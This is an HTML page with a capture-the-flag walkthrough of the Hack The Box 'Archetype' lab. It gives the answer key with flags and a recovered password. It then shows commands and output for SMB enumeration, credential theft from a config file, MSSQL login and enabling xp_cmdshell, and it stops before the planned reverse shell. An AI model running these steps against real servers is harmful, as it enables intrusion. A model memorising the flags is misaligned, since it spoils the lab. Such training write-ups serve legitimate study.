@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><title>Archetype</title><meta charset="utf-8"/><link rel="preload" href="../index.css" as="style"/><link rel="preload" href="../prescript.js" as="script"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Adan Silva's Website"/><meta property="og:title" content="Archetype"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Archetype"/><meta name="twitter:description" content="Tasks Which TCP port is hosting a database server? 1433 What is the name of the non-Administrative share available over SMB? backups What is the password identified in the file on the SMB share? M3g4c0rp123 What script from Impacket collection can be used in order to establish an authenticated conne..."/><meta property="og:description" content="Tasks Which TCP port is hosting a database server? 1433 What is the name of the non-Administrative share available over SMB? backups What is the password identified in the file on the SMB share? M3g4c0rp123 What script from Impacket collection can be used in order to establish an authenticated conne..."/><meta property="og:image:alt" content="Tasks Which TCP port is hosting a database server? 1433 What is the name of the non-Administrative share available over SMB? backups What is the password identified in the file on the SMB share? M3g4c0rp123 What script from Impacket collection can be used in order to establish an authenticated conne..."/><meta property="twitter:domain" content="secmancer.github.io"/><meta property="og:url" content="https://secmancer.github.io/hack-the-box---starting-point/archetype"/><meta property="twitter:url" content="https://secmancer.github.io/hack-the-box---starting-point/archetype"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Tasks Which TCP port is hosting a database server? 1433 What is the name of the non-Administrative share available over SMB? backups What is the password identified in the file on the SMB share? M3g4c0rp123 What script from Impacket collection can be used in order to establish an authenticated conne..."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-735924e0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-589c1cea.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-bbc3f7c0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-2911f5d1.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-e427079e.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-53b25b2b.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-c93c6a44.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-8a06014f.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-77d6a441.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-6ee21cee.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-1ea6ad18.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-34bdfded.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-788c9ca3.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-642859cd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-4abc06bd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-274a3dfe.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-94cb6c84.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-58d5ff56.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-9f9b2774.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-7262b5a7.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a12dcaa2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-26a99b87.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a5c806d2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-6bd36952.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-9857b007.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-d3a1a224.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" data-persist="true"/><script src="../prescript.js" type="application/javascript" data-persist="true"></script><script type="application/javascript" data-persist="true">const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted%20Grotesk%3Awght%40400%3B700&amp;family=Source%20Sans%20Pro%3Aital%2Cwght%400%2C400%3B0%2C600%3B1%2C400%3B1%2C600&amp;family=IBM%20Plex%20Mono%3Awght%40400%3B600&amp;display=swap"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://secmancer.github.io/hack-the-box---starting-point/archetype-og-image.webp"/><meta property="og:image:url" content="https://secmancer.github.io/hack-the-box---starting-point/archetype-og-image.webp"/><meta name="twitter:image" content="https://secmancer.github.io/hack-the-box---starting-point/archetype-og-image.webp"/><meta property="og:image:type" content="image/webp"/></head><body data-slug="hack-the-box---starting-point/archetype" data-basepath><div id="quartz-root" class="page" data-frame="default"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="..">Adan Silva's Website</a></h2><div class="mobile-only"><div class="spacer"></div></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 0.5rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button" aria-label="Search" aria-expanded="false"><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg><p>Search</p></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something..." placeholder="Search for something..."/><div class="search-layout" data-preview="true" data-field-priority="[&quot;title&quot;,&quot;content&quot;,&quot;tags&quot;]"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode" aria-label="Dark mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode" aria-label="Reader mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer nav-files-container" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a2, b2) => {\n    if (!a2.isFolder &amp;&amp; !b2.isFolder || a2.isFolder &amp;&amp; b2.isFolder) {\n      return (a2.displayName || \&quot;\&quot;).localeCompare(b2.displayName || \&quot;\&quot;, void 0, {\n        numeric: true,\n        sensitivity: \&quot;base\&quot;\n      });\n    }\n    if (!a2.isFolder &amp;&amp; b2.isFolder) {\n      return 1;\n    }\n    return -1;\n  }&quot;,&quot;filterFn&quot;:&quot;(node) => node.slugSegment !== \&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;(node) => {\n    return node;\n  }&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-4571" aria-label="Explorer"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-4571" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-1"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#" class="nav-file-title tree-item-self"></a></li></template><template id="template-folder"><li><div class="folder-container nav-folder-title tree-item-self"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon nav-folder-collapse-indicator collapse-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content tree-item-children"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../hack-the-box---starting-point/">Hack The Box - Starting Point</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Archetype</a></div></nav><h1 class="article-title">Archetype</h1><p show-comma="true" class="content-meta"><time datetime="2026-06-24T15:56:34.285Z">Jun 24, 2026</time><span>9 min read</span></p></div></div><article class="popover-hint"><div class="markdown-preview-view markdown-rendered"><h1 id="tasks">Tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#tasks" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<ul>
+<li>Which TCP port is hosting a database server?
+<ul>
+<li>1433</li>
+</ul>
+</li>
+<li>What is the name of the non-Administrative share available over SMB?
+<ul>
+<li>backups</li>
+</ul>
+</li>
+<li>What is the password identified in the file on the SMB share?
+<ul>
+<li>M3g4c0rp123</li>
+</ul>
+</li>
+<li>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+<ul>
+<li>mssqlclient.py</li>
+</ul>
+</li>
+<li>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+<ul>
+<li>xp_cmdshell</li>
+</ul>
+</li>
+<li>What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+<ul>
+<li>WinPEAS</li>
+</ul>
+</li>
+<li>What file contains the administrator’s password?
+<ul>
+<li>ConsoleHost_history.txt</li>
+</ul>
+</li>
+<li>Submit user flag
+<ul>
+<li>3e7b102e78218e935bf3f4951fec21a3</li>
+</ul>
+</li>
+<li>Submit root flag
+<ul>
+<li>b91ccec3305e98240082d4474b848528</li>
+</ul>
+</li>
+</ul>
+<h1 id="steps">Steps<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#steps" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<ul>
+<li>First, we’ll run rustscan to see what is going on</li>
+</ul>
+<pre><code>rustscan --ulimit 5000 --addresses &quot;10.129.95.187&quot; --top -- -sC -sV
+</code></pre>
+<ul>
+<li>From the results, we can see that a database is being ran at 1433</li>
+</ul>
+<pre><code>PORT      STATE SERVICE      REASON          VERSION                                                                                                                                                                                           
+135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                                                                                             
+139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                                                                     
+445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds                                                                                                                                                   
+1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM                                                                                                                                                      
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                                                                                                       
+| Issuer: commonName=SSL_Self_Signed_Fallback                                                                                                                                                                                                  
+| Public Key type: rsa                                                                                                                                                                                                                         
+| Public Key bits: 2048                                                                                                                                                                                                                        
+| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                                                                 
+| Not valid before: 2025-11-26T20:18:48                                                                                                                                                                                                        
+| Not valid after:  2055-11-26T20:18:48                                                                                                                                                                                                        
+| MD5:   cb632cff9e54f1b7d70b69c947c57d18                                                                                                                                                                                                      
+| SHA-1: 7e59b57dd9499ec2527cb6e8e3ac2e75055ade61                                                                                                                                                                                              
+| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                                  
+| MIIDADCCAeigAwIBAgIQG0DlVqb1YrpJYGrmxclPvDANBgkqhkiG9w0BAQsFADA7                                                                                                                                                                             
+| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA                                                                                                                                                                             
+| bABsAGIAYQBjAGswIBcNMjUxMTI2MjAxODQ4WhgPMjA1NTExMjYyMDE4NDhaMDsx                                                                                                                                                                             
+| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs                                                                                                                                                                             
+| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJwFiNur                                                                                                                                                                             
+| bhuQAKuSUkQrTVIxOT/WEFZGdfsIJvKHYQ3CaM+jtBS4JPRPsPzqDnqvCi0q7AlC                                                                                                                                                                             
+| 82S2u6pj6PU1l7MnvoogWiRcaEq0wr2nvQq6b5O9FfcDy2+MZtg0Jg9HfSjDdE0P                                                                                                                                                                             
+| GCj34wyH4Z0IofLEOO1SRqizMQucO1uHzqAh2H5Thiyr4DqBc4ZAVI5Nq0xj3fV3                                                                                                                                                                             
+| vRjuYhVyEFmkhTUXZPs6u9C28aSb47Q6dp6n5kWcspsL8/GDbx5kREodFs44AJ/R                                                                                                                                                                             
+| 9NbtfNqUjkyc2n+1GrNN24mcMcvSWaUgiUOYrUKiU9jQEMWWQfM3HzLSj61tID7X                                                                                                                                                                             
+| y7GwYC8scYhf+NUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAcOJt9Ep9dYVxBY4a                                                                                                                                                                             
+| SVPhZLTRkgpZZB0jB4dVK3MnZEKj5MAfLpsgs5TC+26nxKow0x054TmLRnBZOMll                                                                                                                                                                             
+| BdiEEKfFMSiBUuR620E4cDT/TtA9TSyqAZ1mOyAJvLQVycm9V/St95so0I0Gc4/E                                                                                                                                                                             
+| 8ObLKaTYwOytgtOlWvVaVOoI6DyHv0SKUa+Pa66bO7KC9XZRw4m8r+muaMH5TFre                                                                                                                                                                             
+| y0d00jYcbHd3C8YRrUgvtmmYGpm3TM+RuX2Xzoz32Y+u4ZSzBZWsZgvjcKye8lxH                                                                                                                                                                             
+| fBKldEcd/fomiyGyKgD6vW7es8mhDieiYtAjNiCX/WDLs3MdUoIJqzUGxijoxKuX                                                                                                                                                                             
+| qZWuJQ==  
+|_-----END CERTIFICATE-----  
+|_ssl-date: 2025-11-26T20:22:00+00:00; -15s from scanner time.  
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)  
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)  
+5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
+|_http-server-header: Microsoft-HTTPAPI/2.0  
+|_http-title: Not Found  
+47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
+|_http-server-header: Microsoft-HTTPAPI/2.0  
+|_http-title: Not Found  
+49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC  
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:  
+| smb2-time:    
+|   date: 2025-11-26T20:21:52  
+|_  start_date: N/A  
+| p2p-conficker:    
+|   Checking for Conficker.C or higher...  
+|   Check 1 (port 32731/tcp): CLEAN (Couldn't connect)  
+|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)  
+|   Check 3 (port 35816/udp): CLEAN (Timeout)  
+|   Check 4 (port 4389/udp): CLEAN (Failed to receive data)    
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
+| smb-security-mode:    
+|   account_used: guest  
+|   authentication_level: user  
+|   challenge_response: supported  
+|_  message_signing: disabled (dangerous, but default)  
+|_clock-skew: mean: 1h59m46s, deviation: 4h00m01s, median: -15s  
+| smb-os-discovery:    
+|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)  
+|   Computer name: Archetype  
+|   NetBIOS computer name: ARCHETYPE\x00  
+|   Workgroup: WORKGROUP\x00  
+|_  System time: 2025-11-26T12:21:53-08:00  
+| smb2-security-mode:    
+|   311:    
+|_    Message signing enabled but not required
+</code></pre>
+<ul>
+<li>We also see SMB running on this box as well, so we can use smbclient to see if there are any connectable shares we can see</li>
+</ul>
+<pre><code>smbclient -L 10.129.95.187
+</code></pre>
+<ul>
+<li>Looks like we have one named backups</li>
+</ul>
+<pre><code>Password for [WORKGROUP\root]:  
+  
+       Sharename       Type      Comment  
+       ---------       ----      -------  
+       ADMIN$          Disk      Remote Admin  
+       backups         Disk         
+       C$              Disk      Default share  
+       IPC$            IPC       Remote IPC  
+SMB1 disabled -- no workgroup available
+</code></pre>
+<ul>
+<li>We can now attempt to connect to that share</li>
+</ul>
+<pre><code>smbclient //10.129.95.187/backups
+</code></pre>
+<ul>
+<li>Once connected, we can download the file there</li>
+</ul>
+<pre><code>Password for [WORKGROUP\root]:  
+Try &quot;help&quot; to get a list of possible commands.  
+smb: \> ls  
+ .                                   D        0  Mon Jan 20 04:20:57 2020  
+ ..                                  D        0  Mon Jan 20 04:20:57 2020  
+ prod.dtsConfig                     AR      609  Mon Jan 20 04:23:02 2020  
+  
+               5056511 blocks of size 4096. 2616930 blocks available  
+smb: \> get prod.dtsConfig  
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)  
+smb: \> exit
+</code></pre>
+<ul>
+<li>Printing out this file, we are able to grab out a password</li>
+</ul>
+<pre><code>&lt;DTSConfiguration>  
+   &lt;DTSConfigurationHeading>  
+       &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/>  
+   &lt;/DTSConfigurationHeading>  
+   &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;>  
+       &lt;ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue>  
+   &lt;/Configuration>  
+&lt;/DTSConfiguration>#
+</code></pre>
+<ul>
+<li>It appears to be a password relevant for a SQL database</li>
+<li>We can use Impacket’s MSSQL script to connect to the database. We are able to do this successfully</li>
+</ul>
+<pre><code>[Nov 26, 2025 - 14:54:52 (PST)] exegol-htb-starting-point /workspace # mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth  
+Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies    
+  
+Password:  
+[*] Encryption required, switching to TLS  
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.  
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)    
+[!] Press help for extra shell commands  
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+</code></pre>
+<ul>
+<li>We can run the help command to see what is available to use</li>
+</ul>
+<pre><code>SQL (ARCHETYPE\sql_svc  dbo@master)> help  
+  
+   lcd {path}                 - changes the current local directory to {path}  
+   exit                       - terminates the server process (and this session)  
+   enable_xp_cmdshell         - you know what it means  
+   disable_xp_cmdshell        - you know what it means  
+   enum_db                    - enum databases  
+   enum_links                 - enum linked servers  
+   enum_impersonate           - check logins that can be impersonated  
+   enum_logins                - enum login users  
+   enum_users                 - enum current db users  
+   enum_owner                 - enum db owner  
+   exec_as_user {user}        - impersonate with execute as user  
+   exec_as_login {login}      - impersonate with execute as login  
+   xp_cmdshell {cmd}          - executes cmd using xp_cmdshell  
+   xp_dirtree {path}          - executes xp_dirtree on the path  
+   sp_start_job {cmd}         - executes cmd using the sql server agent (blind)  
+   use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)  
+   ! {cmd}                    - executes a local shell cmd  
+   upload {from} {to}         - uploads file {from} to the SQLServer host {to}  
+   download {from} {to}       - downloads file from the SQLServer host {from} to {to}  
+   show_query                 - show query  
+   mask_query                 - mask query  
+      
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+</code></pre>
+<ul>
+<li>First, let’s confirm that we are in fact, logged in as the administrator of this database</li>
+</ul>
+<pre><code>SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');  
+      
+-      
+1
+</code></pre>
+<ul>
+<li>Looks like we are, so we can use some admin commands to work ourselves through it</li>
+</ul>
+<pre><code>EXEC xp_cmdshell 'net user';
+</code></pre>
+<ul>
+<li>We’ll use this to check if this command is activated, in which it will allow us to spawn shell instances.</li>
+</ul>
+<pre><code>SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';  
+ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable  
+the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+</code></pre>
+<ul>
+<li>This command is not activated, so we need to do the steps to do so</li>
+</ul>
+<pre><code>EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+</code></pre>
+<ul>
+<li>Now, let’s try that again</li>
+</ul>
+<pre><code>xp_cmdshell &quot;whoami&quot;
+</code></pre>
+<ul>
+<li>Finally, we are able to use this command!</li>
+</ul>
+<pre><code>SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell &quot;whoami&quot;  
+output                 
+-----------------      
+archetype\sql_svc      
+  
+NULL
+</code></pre>
+<ul>
+<li>So, we should be able to use this to our advantage. Let’s say, a reverse shell can be executed from here!</li>
+<li>We’ll use a binary to run our shell, specifically this one pointed out from this box.</li>
+<li>So, let’s download a copy</li>
+</ul>
